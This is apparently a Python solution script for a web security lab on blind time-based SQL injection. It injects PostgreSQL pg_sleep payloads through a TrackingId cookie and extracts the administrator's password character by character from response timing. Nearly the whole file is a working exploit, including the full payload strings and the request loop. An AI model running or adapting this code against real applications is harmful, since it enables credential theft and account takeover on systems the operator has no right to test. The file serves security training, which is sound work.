# Lab: Blind SQLi with time delays and information retrieval
import sys
import urllib.parse
import requests
import urllib3
import os
from dotenv import load_dotenv

load_dotenv()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT")
}


def get_admin_passwd(url, trackingID, session_cookie):
    password = " "

    for i in range(1, 21):
        middleChar = int((126 + 32) / 2)
        sqli_payload = "' || (SELECT case when (username = 'administrator' AND ascii(SUBSTRING(password,%d,1)) > '%d') then pg_sleep(10) else pg_sleep(-1) end from users)--" % (i, int(middleChar))
        sqli_payload_encoded = urllib.parse.quote(sqli_payload)
        cookies = {'TrackingId': f'{trackingID}{sqli_payload_encoded}', 'session': f'{session_cookie}'}

        r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)

        if int(r.elapsed.total_seconds()) > 9:
            for j in range(int(middleChar), 126):
                sqli_payload = "' || (SELECT case when (username = 'administrator' AND ascii(SUBSTRING(password, %d,1)) = '%d') then pg_sleep(10) else pg_sleep(-1) end from users)--" % (i, j)
                sqli_payload_encoded = urllib.parse.quote(sqli_payload)
                cookies = {'TrackingId': f'{trackingID}{sqli_payload_encoded}', 'session': f'{session_cookie}'}

                r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
                if int(r.elapsed.total_seconds()) > 9:
                    password += chr(j)
                    sys.stdout.write('\r' + password)
                    sys.stdout.flush()
                    break
                else:
                    sys.stdout.write('\r' + password + chr(j))
                    sys.stdout.flush()
        else:
            for j in range(32, int(middleChar) + 1):
                sqli_payload = "' || (SELECT case when (username = 'administrator' AND ascii(SUBSTRING(password, %d,1)) = '%d') then pg_sleep(10) else pg_sleep(-1) end from users)-- " % (i, j)
                sqli_payload_encoded = urllib.parse.quote(sqli_payload)
                cookies = {'TrackingId': f'{trackingID}{sqli_payload_encoded}', 'session': f'{session_cookie}'}

                r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
                if int(r.elapsed.total_seconds()) > 9:
                    password += chr(j)
                    sys.stdout.write('\r' + password)
                    sys.stdout.flush()
                    break
                else:
                    sys.stdout.write('\r' + password + chr(j))
                    sys.stdout.flush()


def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    TrackingID = "1NsQtdB5vTe6ViG6"
    session_cookie = "XMaPQ64ZWtxCeQS6ATl2wWefCnaOIwLi"
    get_admin_passwd(url, TrackingID, session_cookie)


if __name__ == "__main__":
    main()
